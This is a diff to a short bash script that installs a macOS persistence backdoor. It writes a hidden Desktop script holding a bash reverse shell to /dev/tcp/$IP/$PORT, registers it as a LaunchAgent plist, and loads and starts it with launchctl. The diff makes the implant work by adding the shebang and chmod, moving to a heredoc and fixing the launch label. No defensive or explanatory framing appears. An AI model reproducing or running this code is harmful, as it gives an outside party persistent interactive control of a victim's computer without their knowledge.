@@ -1,16 +1,20 @@
+#!/bin/bash
+
 USR=$(whoami)
 
-echo "bash -c 'exec bash -i &>/dev/tcp/$IP/$PORT <&1 &'" > /Users/$USR/Desktop/.runonstartupMACOS.sh
+echo "#!/bin/bash
+bash -c 'exec bash -i &>/dev/tcp/$IP/$PORT <&1 &'
+" > /Users/$USR/Desktop/.runonstartupMACOS.sh
 
-touch ~/Library/LaunchAgents/com.4lpndev.strt.plist
+chmod +x /Users/$USR/Desktop/.runonstartupMACOS.sh
 
-echo '
+cat <<EOF > ~/Library/LaunchAgents/com.4lpndev.strt.plist
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
 <plist version="1.0">
   <dict>
     <key>Label</key>
-    <string>com.4lpndev.strt.plist</string>
+    <string>com.4lpndev.strt</string>
     <key>ProgramArguments</key>
     <array>
       <string>/Users/$USR/Desktop/.runonstartupMACOS.sh</string>
@@ -23,8 +27,8 @@ echo '
     <string>/tmp/myerrorlogfile.log</string>
   </dict>
 </plist>
-' > ~/Library/LaunchAgents/com.4lpndev.strt.plist
+EOF
 
 launchctl load ~/Library/LaunchAgents/com.4lpndev.strt.plist
 
-launchctl start com.4lpndev.strt.plist
+launchctl start com.4lpndev.strt
